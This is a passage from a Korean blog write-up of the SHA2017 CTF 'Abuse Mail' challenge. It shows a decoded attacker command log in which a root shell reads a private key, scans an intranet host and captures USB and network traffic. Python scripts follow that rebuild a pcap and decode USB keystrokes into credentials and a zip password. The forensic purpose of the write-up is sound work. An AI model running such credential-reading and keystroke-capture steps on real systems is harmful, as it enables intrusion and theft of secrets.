26 04:46 index.php</span><br><span class="line"></span><br><span class="line">command:id</span><br><span class="line">command:uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line"></span><br><span class="line">command:id</span><br><span class="line">command:uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line"></span><br><span class="line">command:id</span><br><span class="line">command:uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line"></span><br><span class="line">command:ls -la /root</span><br><span class="line">command:total 32</span><br><span class="line">drwx------  5 root root 4096 Jul 27 07:27 .</span><br><span class="line">drwxr-xr-x 22 root root 4096 Apr 18 05:43 ..</span><br><span class="line">-rw-------  1 root root 3228 Jul 26 06:44 .bash_history</span><br><span class="line">-rw-r--r--  1 root root 3106 Oct 22  2015 .bashrc</span><br><span class="line">drwxr-xr-x  2 root root 4096 Jul 27 09:11 certs</span><br><span class="line">drwxr-xr-x  2 root root 4096 Jul 26 03:47 .nano</span><br><span class="line">-rw-r--r--  1 root root  148 Aug 17  2015 .profile</span><br><span class="line">drwx------  2 root root 4096 Jul 27 07:27 .ssh</span><br><span class="line"></span><br><span class="line">command:ls -la /root/certs</span><br><span class="line">command:total 16</span><br><span class="line">drwxr-xr-x 2 root root 4096 Jul 27 09:11 .</span><br><span class="line">drwx------ 5 root root 4096 Jul 27 07:27 ..</span><br><span class="line">-rw-r--r-- 1 root root  989 Jul 27 07:23 intranet.crt</span><br><span class="line">-rw-r--r-- 1 root root  916 Jul 27 07:23 intranet.key</span><br><span class="line"></span><br><span class="line">command:cat /root/certs/intranet.crt</span><br><span class="line">command:-----BEGIN CERTIFICATE-----</span><br><span class="line">MIICrDCCAhWgAwIBAgIJALfe3aETCSTsMA0GCSqGSIb3DQEBCwUAMG8xCzAJBgNV</span><br><span class="line">BAYTAk5MMRIwEAYDVQQIDAlGbGV2b2xhbmQxETAPBgNVBAcMCFplZXdvbGRlMRQw</span><br><span class="line">EgYDVQQKDAtTSEEyMDE3IENURjEjMCEGCSqGSIb3DQEJARYUc2hhMjAxN2N0ZkBn</span><br><span class="line">bWFpbC5jb20wHhcNMTcwNzI3MTQyMzIwWhcNMTgwNzI3MTQyMzIwWjBvMQswCQYD</span><br><span class="line">VQQGEwJOTDESMBAGA1UECAwJRmxldm9sYW5kMREwDwYDVQQHDAhaZWV3b2xkZTEU</span><br><span class="line">MBIGA1UECgwLU0hBMjAxNyBDVEYxIzAhBgkqhkiG9w0BCQEWFHNoYTIwMTdjdGZA</span><br><span class="line">Z21haWwuY29tMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC+H/mwETvdjGRn</span><br><span class="line">n/33zsjMOyPsg5xgSCsLDTg9D8XaeGp7ZQ1habE+9G0gabrKYntVburjitcuheXK</span><br><span class="line">hCo6nYWF2pSch4WjhNhCxkM++UeKRUv8xYAtSGl+6vvSrwogR+BfRuxZFAeJzvgK</span><br><span class="line">hNwL7sdW2CJ7Gk89pET/W6AOBNcDWwIDAQABo1AwTjAdBgNVHQ4EFgQUFeykHO7M</span><br><span class="line">V70l0IO87/3ogRb5VxMwHwYDVR0jBBgwFoAUFeykHO7MV70l0IO87/3ogRb5VxMw</span><br><span class="line">DAYDVR0TBAUwAwEB/zANBgkqhkiG9w0BAQsFAAOBgQCITumB4q5A+Lu9EzUe1qAW</span><br><span class="line">rjAeVfXq/qVrw+byH4VqNuEOBQ7lq151VbsXI1YQXCxVbP/r5Zxb1BfS/3qHHFDu</span><br><span class="line">SRqYaxh9c+BRkdAdzkFebMbIocnaLuVFpn237Z/ysSt0PPrTaI3gUSoz/7gXB+nX</span><br><span class="line">DkYKgl7BR0a72yTuLAc0GA==</span><br><span class="line">-----END CERTIFICATE-----</span><br><span class="line"></span><br><span class="line">command:cat /root/certs/intranet.key</span><br><span class="line">command:-----BEGIN PRIVATE KEY-----</span><br><span class="line">MIICdwIBADANBgkqhkiG9w0BAQEFAASCAmEwggJdAgEAAoGBAL4f+bARO92MZGef</span><br><span class="line">/ffOyMw7I+yDnGBIKwsNOD0Pxdp4antlDWFpsT70bSBpuspie1Vu6uOK1y6F5cqE</span><br><span class="line">KjqdhYXalJyHhaOE2ELGQz75R4pFS/zFgC1IaX7q+9KvCiBH4F9G7FkUB4nO+AqE</span><br><span class="line">3Avux1bYInsaTz2kRP9boA4E1wNbAgMBAAECgYEAiYU/aedNUhc2mO3VGeXswC0W</span><br><span class="line">8wDPn6UT3U6WmzRJfJkVDGQvpYJ5vnu2Y3eWsMVDSKyOIkBPHUukxzOKCBPge449</span><br><span class="line">kMwW8cX0nHSGFl1HsYiY14Lr/BiOXz/c+I9Yg+Bexf5kCTYAjzqZ1ZErrIQvagNE</span><br><span class="line">pXb1GGZrnrU7wH9FI8ECQQDhwEnscmqsnPr43E0eFUy3OybfQfo+mSRdq84zwHoW</span><br><span class="line">BofTUUOpDZpZhIWt6JsdsSqqYVt+W8XHqILraK/EQDnpAkEA15mi7tjozljGcjVP</span><br><span class="line">dYzB4m24vRK4guujNSJDXKwoDvjDI8x3iu/iTtfxkM3Swko4bxWwiUB7MOaCLgQO</span><br><span class="line">HaaEowJAXIzswZcWzLV+3s/SfebVkLkbcqQl58v48L4ix2y9oJIE1UmXp5MAGHsQ</span><br><span class="line">IwAdt8qOZ1OKov8U0onvQnuks5xxIQJBAMwBz5/MVfYzIIwfD7H+X9Pe2Ojn1vni</span><br><span class="line">+IslgbImIL2R/CxapF8uf+j1AtpvN9eqnV3XmzU0c50g8NuT8LtzvpsCQGUArCoa</span><br><span class="line">ps7xk/SxGfz3IBrsUIOn3Iqh9wqoLfu7wVuc+LFIwkrNm6D5ZnzUapvO2oqj+5ER</span><br><span class="line">iuSWkHY6ll1V1m0=</span><br><span class="line">-----END PRIVATE KEY-----</span><br><span class="line"></span><br><span class="line">command:cat /root/certs/intranet.key</span><br><span class="line">command:-----BEGIN PRIVATE KEY-----</span><br><span class="line">MIICdwIBADANBgkqhkiG9w0BAQEFAASCAmEwggJdAgEAAoGBAL4f+bARO92MZGef</span><br><span class="line">/ffOyMw7I+yDnGBIKwsNOD0Pxdp4antlDWFpsT70bSBpuspie1Vu6uOK1y6F5cqE</span><br><span class="line">KjqdhYXalJyHhaOE2ELGQz75R4pFS/zFgC1IaX7q+9KvCiBH4F9G7FkUB4nO+AqE</span><br><span class="line">3Avux1bYInsaTz2kRP9boA4E1wNbAgMBAAECgYEAiYU/aedNUhc2mO3VGeXswC0W</span><br><span class="line">8wDPn6UT3U6WmzRJfJkVDGQvpYJ5vnu2Y3eWsMVDSKyOIkBPHUukxzOKCBPge449</span><br><span class="line">kMwW8cX0nHSGFl1HsYiY14Lr/BiOXz/c+I9Yg+Bexf5kCTYAjzqZ1ZErrIQvagNE</span><br><span class="line">pXb1GGZrnrU7wH9FI8ECQQDhwEnscmqsnPr43E0eFUy3OybfQfo+mSRdq84zwHoW</span><br><span class="line">BofTUUOpDZpZhIWt6JsdsSqqYVt+W8XHqILraK/EQDnpAkEA15mi7tjozljGcjVP</span><br><span class="line">dYzB4m24vRK4guujNSJDXKwoDvjDI8x3iu/iTtfxkM3Swko4bxWwiUB7MOaCLgQO</span><br><span class="line">HaaEowJAXIzswZcWzLV+3s/SfebVkLkbcqQl58v48L4ix2y9oJIE1UmXp5MAGHsQ</span><br><span class="line">IwAdt8qOZ1OKov8U0onvQnuks5xxIQJBAMwBz5/MVfYzIIwfD7H+X9Pe2Ojn1vni</span><br><span class="line">+IslgbImIL2R/CxapF8uf+j1AtpvN9eqnV3XmzU0c50g8NuT8LtzvpsCQGUArCoa</span><br><span class="line">ps7xk/SxGfz3IBrsUIOn3Iqh9wqoLfu7wVuc+LFIwkrNm6D5ZnzUapvO2oqj+5ER</span><br><span class="line">iuSWkHY6ll1V1m0=</span><br><span class="line">-----END PRIVATE KEY-----</span><br><span class="line"></span><br><span class="line">command:cat /etc/hosts</span><br><span class="line">command:127.0.0.1	localhost</span><br><span class="line">127.0.1.1	ubuntu</span><br><span class="line"></span><br><span class="line"># The following lines are desirable for IPv6 capable hosts</span><br><span class="line">::1     localhost ip6-localhost ip6-loopback</span><br><span class="line">ff02::1 ip6-allnodes</span><br><span class="line">ff02::2 ip6-allrouters</span><br><span class="line">10.29.0.1	router</span><br><span class="line">192.168.1.1     router</span><br><span class="line">192.168.1.2     intranet</span><br><span class="line"></span><br><span class="line">command:nohup nmap intranet &gt; /tmp/intranet.nmap</span><br><span class="line">command:</span><br><span class="line">command:cat /tmp/intranet.nmap</span><br><span class="line">command:</span><br><span class="line">Starting Nmap 7.01 ( https://nmap.org ) at 2017-07-27 09:48 PDT</span><br><span class="line">Nmap scan report for intranet (192.168.1.2)</span><br><span class="line">Host is up (0.00010s latency).</span><br><span class="line">Not shown: 997 closed ports</span><br><span class="line">PORT    STATE SERVICE</span><br><span class="line">22/tcp  open  ssh</span><br><span class="line">80/tcp  open  http</span><br><span class="line">443/tcp open  https</span><br><span class="line">MAC Address: 00:0C:29:3D:FD:B0 (VMware)</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 1.52 seconds</span><br><span class="line"></span><br><span class="line">command:cat /tmp/intranet.nmap</span><br><span class="line">command:</span><br><span class="line">Starting Nmap 7.01 ( https://nmap.org ) at 2017-07-27 09:48 PDT</span><br><span class="line">Nmap scan report for intranet (192.168.1.2)</span><br><span class="line">Host is up (0.00010s latency).</span><br><span class="line">Not shown: 997 closed ports</span><br><span class="line">PORT    STATE SERVICE</span><br><span class="line">22/tcp  open  ssh</span><br><span class="line">80/tcp  open  http</span><br><span class="line">443/tcp open  https</span><br><span class="line">MAC Address: 00:0C:29:3D:FD:B0 (VMware)</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 1.52 seconds</span><br><span class="line"></span><br><span class="line">command:cat /tmp/intranet.nmap</span><br><span class="line">command:</span><br><span class="line">Starting Nmap 7.01 ( https://nmap.org ) at 2017-07-27 09:48 PDT</span><br><span class="line">Nmap scan report for intranet (192.168.1.2)</span><br><span class="line">Host is up (0.00010s latency).</span><br><span class="line">Not shown: 997 closed ports</span><br><span class="line">PORT    STATE SERVICE</span><br><span class="line">22/tcp  open  ssh</span><br><span class="line">80/tcp  open  http</span><br><span class="line">443/tcp open  https</span><br><span class="line">MAC Address: 00:0C:29:3D:FD:B0 (VMware)</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 1.52 seconds</span><br><span class="line"></span><br><span class="line">command:cat /tmp/intranet.nmap</span><br><span class="line">command:</span><br><span class="line">Starting Nmap 7.01 ( https://nmap.org ) at 2017-07-27 09:48 PDT</span><br><span class="line">Nmap scan report for intranet (192.168.1.2)</span><br><span class="line">Host is up (0.00010s latency).</span><br><span class="line">Not shown: 997 closed ports</span><br><span class="line">PORT    STATE SERVICE</span><br><span class="line">22/tcp  open  ssh</span><br><span class="line">80/tcp  open  http</span><br><span class="line">443/tcp open  https</span><br><span class="line">MAC Address: 00:0C:29:3D:FD:B0 (VMware)</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 1.52 seconds</span><br><span class="line"></span><br><span class="line">command:curl -k https://intranet/</span><br><span class="line">command:  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current</span><br><span class="line">                                 Dload  Upload   Total   Spent    Left  Speed</span><br><span class="line">100   456  100   456    0     0   4871      0 --:--:-- --:--:-- --:--:--  4903</span><br><span class="line">&lt;!DOCTYPE HTML PUBLIC &quot;-//IETF//DTD HTML 2.0//EN&quot;&gt;</span><br><span class="line">&lt;html&gt;&lt;head&gt;</span><br><span class="line">&lt;title&gt;401 Unauthorized&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;&lt;body&gt;</span><br><span class="line">&lt;h1&gt;Unauthorized&lt;/h1&gt;</span><br><span class="line">&lt;p&gt;This server could not verify that you</span><br><span class="line">are authorized to access the document</span><br><span class="line">requested.  Either you supplied the wrong</span><br><span class="line">credentials (e.g., bad password), or your</span><br><span class="line">browser doesn&apos;t understand how to supply</span><br><span class="line">the credentials required.&lt;/p&gt;</span><br><span class="line">&lt;hr&gt;</span><br><span class="line">&lt;address&gt;Apache/2.4.18 (Ubuntu) Server at intranet Port 443&lt;/address&gt;</span><br><span class="line">&lt;/body&gt;&lt;/html&gt;</span><br><span class="line"></span><br><span class="line">command:tcpdump -D</span><br><span class="line">command:1.ens33 [Up, Running]</span><br><span class="line">2.ens39 [Up, Running]</span><br><span class="line">3.any (Pseudo-device that captures on all interfaces) [Up, Running]</span><br><span class="line">4.lo [Up, Running, Loopback]</span><br><span class="line">5.nflog (Linux netfilter log (NFLOG) interface)</span><br><span class="line">6.nfqueue (Linux netfilter queue (NFQUEUE) interface)</span><br><span class="line">7.usbmon1 (USB bus number 1)</span><br><span class="line">8.usbmon2 (USB bus number 2)</span><br><span class="line"></span><br><span class="line">command:tcpdump -i usbmon2 -w /tmp/usb.pcap</span><br><span class="line">command:tcpdump host intranet -w /tmp/intranet.pcap</span><br></pre></td></tr></table></figure>
+<p>그러면 <code>abuse03.pcap</code>은 까보면 <code>getfile</code>을 하고 있다.</p>
+<p><code>intranet.pcap</code>, <code>usb.pcap</code>을 각각 저장해주자.</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">data = open(<span class="string">'getfile_intranet.txt'</span>).read()</span><br><span class="line"></span><br><span class="line">files = data.replace(<span class="string">'\n'</span>, <span class="string">''</span>).split(<span class="string">'getfile:'</span>)[<span class="number">1</span>:]</span><br><span class="line">output = [<span class="number">0</span>] * len(files)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> file <span class="keyword">in</span> files:</span><br><span class="line">	file = file.split(<span class="string">':'</span>)</span><br><span class="line">	output[int(file[<span class="number">0</span>])] = file[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">f = open(<span class="string">'intranet.pcap'</span>, <span class="string">'w'</span>)</span><br><span class="line">f.write(base64.urlsafe_b64decode(<span class="string">''</span>.join(output)))</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure>
+<p>그럼 이제 <code>intranet.pcap</code>을 열어보자<br>그러면 <code>TLS</code>가 뜨는데 이건 방금 <code>command</code>에서 본 <code>intranet.key</code>파일을 이용하면 복호화가 된다.</p>
+<img src="/2017/08/07/SHA2017-CTF-Abuse-Mail-300-pts/img03.png">
+<p><code>HTTP</code>로 <code>secret.zip</code>파일을 다운받는걸 알 수 있다.</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">GET /secret.zip HTTP/1.1</span><br><span class="line">Host: intranet</span><br><span class="line">Authorization: Basic cm9vdDpXZWxjb21lMTIz</span><br><span class="line">User-Agent: curl/7.47.0</span><br><span class="line">Accept: */*</span><br><span class="line"></span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Date: Thu, 27 Jul 2017 16:12:24 GMT</span><br><span class="line">Server: Apache/2.4.18 (Ubuntu)</span><br><span class="line">Last-Modified: Thu, 27 Jul 2017 15:10:23 GMT</span><br><span class="line">ETag: <span class="string">"2a1bf-5554df6bc7584"</span></span><br><span class="line">Accept-Ranges: bytes</span><br><span class="line">Content-Length: 172479</span><br><span class="line">Content-Type: application/zip</span><br><span class="line"></span><br><span class="line">PK....	....9.J...w|...x...</span><br></pre></td></tr></table></figure>
+<p><code>Export</code>기능으로 파일을 일단 저장해주고 열어보자.</p>
+<p>근데 암호가 걸려있다.<br><img src="/2017/08/07/SHA2017-CTF-Abuse-Mail-300-pts/img05.png"></p>
+<p><code>usb.pcap</code>에 비밀번호를 키보드로 입력했을거라 생각했다.</p>
+<p><code>usb.pcap</code>파일을 열면 <code>usb</code>패킷이 있으니 <code>keyabord event</code>를 긁어온다.</p>
+<h3 id="usb-to-key-py"><a href="#usb-to-key-py" class="headerlink" title="usb_to_key.py"></a>usb_to_key.py</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">KEY_CODES = &#123;</span><br><span class="line">    <span class="number">0x04</span>:[<span class="string">'a'</span>, <span class="string">'A'</span>],</span><br><span class="line">    <span class="number">0x05</span>:[<span class="string">'b'</span>, <span class="string">'B'</span>],</span><br><span class="line">    <span class="number">0x06</span>:[<span class="string">'c'</span>, <span class="string">'C'</span>],</span><br><span class="line">    <span class="number">0x07</span>:[<span class="string">'d'</span>, <span class="string">'D'</span>],</span><br><span class="line">    <span class="number">0x08</span>:[<span class="string">'e'</span>, <span class="string">'E'</span>],</span><br><span class="line">    <span class="number">0x09</span>:[<span class="string">'f'</span>, <span class="string">'F'</span>],</span><br><span class="line">    <span class="number">0x0A</span>:[<span class="string">'g'</span>, <span class="string">'G'</span>],</span><br><span class="line">    <span class="number">0x0B</span>:[<span class="string">'h'</span>, <span class="string">'H'</span>],</span><br><span class="line">    <span class="number">0x0C</span>:[<span class="string">'i'</span>, <span class="string">'I'</span>],</span><br><span class="line">    <span class="number">0x0D</span>:[<span class="string">'j'</span>, <span class="string">'J'</span>],</span><br><span class="line">    <span class="number">0x0E</span>:[<span class="string">'k'</span>, <span class="string">'K'</span>],</span><br><span class="line">    <span class="number">0x0F</span>:[<span class="string">'l'</span>, <span class="string">'L'</span>],</span><br><span class="line">    <span class="number">0x10</span>:[<span class="string">'m'</span>, <span class="string">'M'</span>],</span><br><span class="line">    <span class="number">0x11</span>:[<span class="string">'n'</span>, <span class="string">'N'</span>],</span><br><span class="line">    <span class="number">0x12</span>:[<span class="string">'o'</span>, <span class="string">'O'</span>],</span><br><span class="line">    <span class="number">0x13</span>:[<span class="string">'p'</span>, <span class="string">'P'</span>],</span><br><span class="line">    <span class="number">0x14</span>:[<span class="string">'q'</span>, <span class="string">'Q'</span>],</span><br><span class="line">    <span class="number">0x15</span>:[<span class="string">'r'</span>, <span class="string">'R'</span>],</span><br><span class="line">    <span class="number">0x16</span>:[<span class="string">'s'</span>, <span class="string">'S'</span>],</span><br><span class="line">    <span class="number">0x17</span>:[<span class="string">'t'</span>, <span class="string">'T'</span>],</span><br><span class="line">    <span class="number">0x18</span>:[<span class="string">'u'</span>, <span class="string">'U'</span>],</span><br><span class="line">    <span class="number">0x19</span>:[<span class="string">'v'</span>, <span class="string">'V'</span>],</span><br><span class="line">    <span class="number">0x1A</span>:[<span class="string">'w'</span>, <span class="string">'W'</span>],</span><br><span class="line">    <span class="number">0x1B</span>:[<span class="string">'x'</span>, <span class="string">'X'</span>],</span><br><span class="line">    <span class="number">0x1C</span>:[<span class="string">'y'</span>, <span class="string">'Y'</span>],</span><br><span class="line">    <span class="number">0x1D</span>:[<span class="string">'z'</span>, <span class="string">'Z'</span>],</span><br><span class="line">    <span class="number">0x1E</span>:[<span class="string">'1'</span>, <span class="string">'!'</span>],</span><br><span class="line">    <span class="number">0x1F</span>:[<span class="string">'2'</span>, <span class="string">'@'</span>],</span><br><span class="line">    <span class="number">0x20</span>:[<span class="string">'3'</span>, <span class="string">'#'</span>],</span><br><span class="line">    <span class="number">0x21</span>:[<span class="string">'4'</span>, <span class="string">'$'</span>],</span><br><span class="line">    <span class="number">0x22</span>:[<span class="string">'5'</span>, <span class="string">'%'</span>],</span><br><span class="line">    <span class="number">0x23</span>:[<span class="string">'6'</span>, <span class="string">'^'</span>],</span><br><span class="line">    <span class="number">0x24</span>:[<span class="string">'7'</span>, <span class="string">'&amp;'</span>],</span><br><span class="line">    <span class="number">0x25</span>:[<span class="string">'8'</span>, <span class="string">'*'</span>],</span><br><span class="line">    <span class="number">0x26</span>:[<span class="string">'9'</span>, <span class="string">'('</span>],</span><br><span class="line">    <span class="number">0x27</span>:[<span class="string">'0'</span>, <span class="string">')'</span>],</span><br><span class="line">    <span class="number">0x28</span>:[<span class="string">'\n'</span>],</span><br><span class="line">    <span class="number">0x2C</span>:[<span class="string">' '</span>],</span><br><span class="line">    <span class="number">0x2D</span>:[<span class="string">'-'</span>, <span class="string">'_'</span>],</span><br><span class="line">    <span class="number">0x2E</span>:[<span class="string">'='</span>, <span class="string">'+'</span>],</span><br><span class="line">    <span class="number">0x2F</span>:[<span class="string">'['</span>, <span class="string">'&#123;'</span>],</span><br><span class="line">    <span class="number">0x30</span>:[<span class="string">']'</span>, <span class="string">'&#125;'</span>],</span><br><span class="line">    <span class="number">0x33</span>:[<span class="string">';'</span>, <span class="string">':'</span>],</span><br><span class="line">    <span class="number">0x38</span>:[<span class="string">'/'</span>, <span class="string">'?'</span>],</span><br><span class="line">    <span class="number">0x37</span>:[<span class="string">'.'</span>, <span class="string">'&gt;'</span>],</span><br><span class="line">    <span class="number">0x2b</span>:<span class="string">'[TAB]'</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#tshark -r ./usb.pcap -Y 'usb.capdata' -T fields -e usb.capdata &gt; keyboards.txt</span></span><br><span class="line">datas = open(<span class="string">'keyboards.txt'</span>).read().split(<span class="string">'\n'</span>)[:<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line">output = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> data <span class="keyword">in</span> datas:</span><br><span class="line">    shift = int(data.split(<span class="string">':'</span>)[<span class="number">0</span>], <span class="number">16</span>) / <span class="number">2</span></span><br><span class="line">    key = int(data.split(<span class="string">':'</span>)[<span class="number">2</span>], <span class="number">16</span>)</span><br><span class="line">    <span class="keyword">if</span> key == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    output += KEY_CODES[key][shift]</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> output</span><br></pre></td></tr></table></figure>
+<h3 id="실행결과"><a href="#실행결과" class="headerlink" title="실행결과 :"></a>실행결과 :</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root</span><br><span class="line">Welcome123</span><br><span class="line">ls -la</span><br><span class="line">curl -ks https://root:Welcome123@intranet/secret.zip</span><br><span class="line">unzip secret.zip</span><br><span class="line">Pyj4m4P4rtY@2017</span><br><span class="line">cat secret.txt</span><br><span class="line">display hamburg[</span><br><span class="line">logoout</span><br></pre></td></tr></table></figure>
+<p><code>password</code>가 <code>Pyj4m4P4rtY@2017</code>라는것을 구했다.</p>
+<img src="/2017/08/07/SHA2017-CTF-Abuse-Mail-300-pts/img06.png">
+
+        </div>
+        <footer class="article-footer">
+            
+
+
+
+    <a data-url="https://kimtruth.github.io/2017/08/07/SHA2017-CTF-Abuse-Mail-300-pts/" data-id="ckor8g4mp0035hqwy4wrm2lhj" class="article-share-link"><i class="fa fa-share"></i>Compartir</a>
+<script>
+    (function ($) {
+        $('body').on('click', function() {
+            $('.article-share-box.on').removeClass('on');
+        }).on('click', '.article-share-link', function(e) {
+            e.stopPropagation();
+
+            var $this = $(this),
+                url = $this.attr('data-url'),
+                encodedUrl = encodeURIComponent(url),
+                id = 'article-share-box-' + $this.attr('data-id'),
+                offset = $this.offset(),
+                box;
+
+            if ($('#' + id).length) {
+                box = $('#' + id);
+
+                if (box.hasClass('on')){
+                    box.removeClass('on');
+                    return;
+                }
+            } else {
+                var html = [
+                    '<div id="' + id + '" class="article-share-box">',
+                        '<input class="article-share-input" value="' + url + '">',
+                        '<div class="article-share-links">',
+                            '<a href="https://twitter.com/intent/tweet?url=' + encodedUrl + '" class="article-share-twitter" target="_blank" title="Twitter"></a>',
+                            '<a href="https://www.facebook.com/sharer.php?u=' + encodedUrl + '" class="article-share-facebook" target="_blank" title="Facebook"></a>',
+                            '<a href="http://pinterest.com/pin/create/button/?url=' + encodedUrl + '" class="article-share-pinterest" target="_blank" title="Pinterest"></a>',
+                            '<a href="https://plus.google.com/share?url=' + encodedUrl + '" class="article-share-google" target="_blank" title="Google+"></a>',
+                        '</div>',
+                    '</div>'
+                ].join('');
+
+              box = $(html);
+
+              $('body').append(box);
+            }
+
+            $('.article-share-box.on').hide();
+
+            box.css({
+                top: offset.top + 25,
+                left: offset.left
+            }).addClass('on');
+
+        }).on('click', '.article-share-box', function (e) {
+            e.stopPropagation();
+        }).on('click', '.article-share-box-input', function () {
+            $(this).select();
+        }).on('click', '.article-share-box-link', function (e) {
+            e.preventDefault();
+            e.stopPropagation();
+
+            window.open(this.href, 'article-share-box-window-' + Date.now(), 'width=500,height=450');
+        });
+    })(jQuery);
+</script>
+
+        </footer>
+    </div>
+</article>
+
+    <section id="comments">
+    
+        
+    <div id="disqus_thread">
+        <noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    </div>
+
+    
+    </section>
+
+
+                        </div>
+                    </section>
+                    <aside id="sidebar">
+    <a class="sidebar-toggle" title="Expand Sidebar"><i class="toggle icon"></i></a>
+    <div class="sidebar-top">
+        <p>seguir:</p>
+        <ul class="social-links">
+            
+                
+                <li>
+                    <a class="social-tooltip" title="facebook" href="https://www.facebook.com/k1mtruth" target="_blank">
+                        <i class="icon fa fa-facebook"></i>
+                    </a>
+                </li>
+                
+            
+                
+                <li>
+                    <a class="social-tooltip" title="github" href="https://github.com/kimtruth/" target="_blank">
+                        <i class="icon fa fa-github"></i>
+                    </a>
+                </li>
+                
+            
+        </ul>
+    </div>
+    
+        
+<nav id="article-nav">
+    
+        <a href="/2017/08/07/SHA2017-CTF-Compromised-100-pts/" id="article-nav-newer" class="article-nav-link-wrap">
+        <strong class="article-nav-caption">més nou</strong>
+        <p class="article-nav-title">
+        
+            SHA2017 CTF - Compromised (100 pts.)
+        
+        </p>
+        <i class="icon fa fa-chevron-right" id="icon-chevron-right"></i>
+    </a>
+    
+    
+        <a href="/2017/07/17/Samsung-CTF-PreQuals-2017-Turing-competition-700-pts/" id="article-nav-older" class="article-nav-link-wrap">
+        <strong class="article-nav-caption">antic</strong>
+        <p class="article-nav-title">Samsung CTF PreQuals 2017 - Turing competition (700 pts.)</p>
+        <i class="icon fa fa-chevron-left" id="icon-chevron-left"></i>
+        </a>
+    
+</nav>
+
+    
+    <div class="widgets-container">
+        
+            
+                
+    <div class="widget-wrap">
+        <h3 class="widget-title">recents</h3>
+        <div class="widget">
+            <ul id="recent-post" class="">
+                
+                    <li>
+                        
+                        <div class="item-thumbnail">
+                            <a href="/2021/05/16/Frag-Attacks/" class="thumbnail">
+    
+    
+        <span style="background-image:url(/2021/05/16/Frag-Attacks/title.png)" alt="Frag Attacks" class="thumbnail-image"></span>
+    
+    
+</a>
+
+                        </div>
+                        
+                        <div class="item-inner">
+                            <p class="item-category"><a class="article-category-link" href="/categories/Hacking/">Hacking</a><i class="icon fa fa-angle-right"></i><a class="article-category-link" href="/categories/Hacking/Network/">Network</a></p>
+                            <p class="item-title"><a href="/2021/05/16/Frag-Attacks/" class="title">Frag Attacks</a></p>
+                            <p class="item-date"><time datetime="2021-05-16T10:12:38.000Z" itemprop="datePublished">2021-05-16</time></p>
+                        </div>
+                    </li>
+                
+                    <li>
+                        
+                        <div class="item-thumbnail">
+                            <a href="/2020/09/27/2020-CCE-cms-again/" class="thumbnail">
+    
+    
+        <span style="background-image:url(/2020/09/27/2020-CCE-cms-again/0.png)" alt="2020 CCE - cms again" class="thumbnail-image"></span>
+    
+    
+</a>
+
+                        </div>
+                        
+                        <div class="item-inner">
+                            <p class="item-category"><a class="article-category-link" href="/categories/Hacking/">Hacking</a><i class="icon fa fa-angle-right"></i><a class="article-category-link" href="/categories/Hacking/Web/">Web</a></p>
+                            <p class="item-title"><a href="/2020/09/27/2020-CCE-cms-again/" class="title">2020 CCE - cms again</a></p>
